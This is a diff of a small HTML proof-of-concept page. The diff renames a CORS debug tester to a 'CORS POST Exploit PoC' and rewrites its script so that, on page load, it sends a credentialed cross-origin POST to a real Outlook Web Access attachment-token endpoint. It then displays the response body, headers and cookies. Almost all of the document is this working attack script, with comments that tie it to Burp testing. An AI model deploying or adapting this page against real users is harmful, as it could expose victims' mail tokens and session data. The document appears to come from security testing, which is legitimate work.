@@ -2,67 +2,61 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>CORS Debug PoC</title>
+  <title>CORS POST Exploit PoC</title>
 </head>
 <body>
-  <h1>CORS Debug Tester</h1>
+  <h1>CORS POST Exploit PoC</h1>
   <p><strong>Status:</strong> <span id="status">Waiting…</span></p>
   <pre id="output" style="white-space: pre-wrap;"></pre>
 
   <script>
-    const target = "https://outlook.office365.com/owa/service.svc?action=GetAttachmentDownloadToken&app=Mail&n=76"; // replace this
-    const method = "GET"; // or POST
-    const sendCredentials = true; // set to true to test cookies
-
-    const data = {
-      test: "cors-debug"
+    const target = "https://outlook.office365.com/owa/service.svc?action=GetAttachmentDownloadToken&app=Mail&n=76"; // Replace with actual endpoint
+    const postData = {
+      // Replace this with the body of your Burp POST request
+      exampleKey: "exampleValue",
+      action: "checkSession"
     };
 
-    async function testCORS() {
-      document.getElementById("status").textContent = "Sending request...";
-
-      const headers = {
-        "Content-Type": "application/json"
-      };
-
-      const options = {
-        method: method,
-        mode: "cors",
-        credentials: sendCredentials ? "include" : "omit",
-        headers: headers,
-        ...(method === "POST" ? { body: JSON.stringify(data) } : {})
-      };
+    async function runPoC() {
+      document.getElementById("status").textContent = "Sending POST…";
 
       try {
-        const response = await fetch(target, options);
+        const response = await fetch(target, {
+          method: "POST",
+          mode: "cors",
+          credentials: "include", // Crucial to send cookies/session
+          headers: {
+            "Content-Type": "application/json" // Matches Burp request
+          },
+          body: JSON.stringify(postData)
+        });
 
-        const result = {
+        const output = {
           status: response.status,
           statusText: response.statusText,
           headers: {},
-          cookiesSent: document.cookie || "(none)",
+          cookiesSent: document.cookie || "(none)"
         };
 
         for (let pair of response.headers.entries()) {
-          result.headers[pair[0]] = pair[1];
+          output.headers[pair[0]] = pair[1];
         }
 
         try {
-          const text = await response.text();
-          result.body = text;
+          output.body = await response.text();
         } catch (e) {
-          result.body = "(Could not read body)";
+          output.body = "(Failed to read body)";
         }
 
-        document.getElementById("status").textContent = "✅ Response received";
-        document.getElementById("output").textContent = JSON.stringify(result, null, 2);
+        document.getElementById("status").textContent = `✅ ${response.status} ${response.statusText}`;
+        document.getElementById("output").textContent = JSON.stringify(output, null, 2);
       } catch (err) {
         document.getElementById("status").textContent = "❌ Request failed";
         document.getElementById("output").textContent = err.toString();
       }
     }
 
-    testCORS();
+    runPoC();
   </script>
 </body>
 </html>
